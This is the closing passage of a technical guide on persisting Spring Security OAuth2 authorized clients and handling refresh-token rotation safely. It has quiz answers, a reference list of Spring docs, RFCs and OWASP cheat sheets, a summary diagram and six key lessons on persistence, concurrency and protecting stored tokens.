Not by default. It may be a transient outage requiring bounded retries and degraded handling without wiping valid grants.

**7. On a refresh timeout, can you retry `R1` indefinitely?**

No. The OP may have already rotated `R1` → `R2` while the response was lost; retrying `R1` risks triggering replay detection.

**8. Can `synchronized` coordinate refreshes across a cluster?**

No. `synchronized` works only within one JVM; you need distributed coordination with fencing and versioned persistence.

**9. Does removing the local authorized client revoke the Refresh Token at the OP?**

No. Remote revocation uses a separate endpoint/protocol when supported by the provider.

**10. If a browser loses its HTTP session after a restart while the JDBC record remains, did token persistence fail?**

No. HTTP sessions/`SecurityContext` and authorized-client persistence have separate lifecycles and backends.

## 42. References

- Spring Security — OAuth2 Client (Servlet): https://docs.spring.io/spring-security/reference/servlet/oauth2/client/index.html
- Spring Security — Authorized Clients: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/authorized-clients.html
- Spring Security — OAuth2 Login (Servlet): https://docs.spring.io/spring-security/reference/servlet/oauth2/login/index.html
- Spring Security — Core Interfaces and Classes: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/core.html
- Spring Security — Reactive OAuth2 Client: https://docs.spring.io/spring-security/reference/reactive/oauth2/client/index.html
- Spring Security — Reactive OAuth2 Client Core: https://docs.spring.io/spring-security/reference/reactive/oauth2/client/core.html
- Spring Security — OAuth2AuthorizedClientManager Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/OAuth2AuthorizedClientManager.html
- Spring Security — JdbcOAuth2AuthorizedClientService Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/JdbcOAuth2AuthorizedClientService.html
- Spring Security — AuthorizedClientServiceOAuth2AuthorizedClientManager Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/AuthorizedClientServiceOAuth2AuthorizedClientManager.html
- Spring Security — DefaultOAuth2AuthorizedClientManager Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/DefaultOAuth2AuthorizedClientManager.html
- Spring Framework — Transactions: https://docs.spring.io/spring-framework/reference/data-access/transaction.html
- Spring Boot — SQL Database Initialization: https://docs.spring.io/spring-boot/reference/how-to/data-initialization.html
- Testcontainers — PostgreSQL Module: https://java.testcontainers.org/modules/databases/postgres/
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
- RFC 6749 — OAuth 2.0 Authorization Framework, Refreshing an Access Token: https://www.rfc-editor.org/rfc/rfc6749#section-6
- RFC 9700 — OAuth 2.0 Security Best Current Practice: https://www.rfc-editor.org/rfc/rfc9700
- RFC 7009 — OAuth 2.0 Token Revocation: https://www.rfc-editor.org/rfc/rfc7009
- RFC 6750 — Bearer Token Usage: https://www.rfc-editor.org/rfc/rfc6750
- RFC 8705 — Mutual TLS OAuth2: https://www.rfc-editor.org/rfc/rfc8705
- RFC 9449 — DPoP: https://www.rfc-editor.org/rfc/rfc9449
- OWASP — Secrets Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- OWASP — Logging Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- OWASP — Cryptographic Storage Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html

## 43. Summary

~~~text
OIDC Login / OAuth2 Authorization
   |
   v
OAuth2AuthorizedClient (registration + principal + tokens)
   |
   v
Persistent OAuth2AuthorizedClientService
   |
   +-- JDBC baseline: durability after restart / shared DB
   +-- Protected storage: access control + encryption + backups
   |
   v
OAuth2AuthorizedClientManager
   |
   +-- Access Token still valid -> use it
   |
   +-- Access Token expires + Refresh Token available
           |
           v
      Per-connection single-flight before Token Endpoint
           |
           v
      OP rotates Refresh R1 -> R2
           |
           v
      Conditional versioned CAS save + encrypted tokens
           |
           +-- success: use Access A2
           +-- stale snapshot: reload and reconcile
           +-- invalid_grant: conditional cleanup + reauth policy
           +-- 503/timeout: bounded recovery, don't delete blindly
~~~

**Six Key Lessons:**

1. **Persistence and rotation are separate concerns.** `JdbcOAuth2AuthorizedClientService` keeps authorized clients across restarts, yet does not synchronize refreshes across multiple nodes out of the box.
2. **New Refresh Tokens must be saved consistently.** When the OP rotates `R1` → `R2`, both the database and manager must adopt `R2` without losing `R2` to stale success or failure handlers.
3. **Single-flight before the OP, CAS after the OP.** CAS alone cannot prevent duplicate remote calls using `R1`; local `synchronized` blocks cannot protect a cluster.
4. **Distinguish `invalid_grant` from transient errors.** Token Endpoint 503s or timeouts do not mean a revoked grant, though timeouts carry unknown outcomes that make blind retries dangerous.
5. **The token store is a sensitive credential vault.** Protect it with least privilege, TLS, encryption/KMS, backups/retention, and never log raw Access or Refresh Tokens.
6. **Prove behavior with integration tests.** Test save/reload, real DBs, controlled OP rotation, concurrent requests, stale failure cleanup, DB write failures, provider isolation, and proper re-authorization policies.

A reliably operated OAuth2/OIDC Client system does more than survive restarts; it **persists the right token version, prevents unintended Refresh Token reuse, handles uncertain provider/DB failures safely, and enforces security boundaries across users, clients, and tenants**.
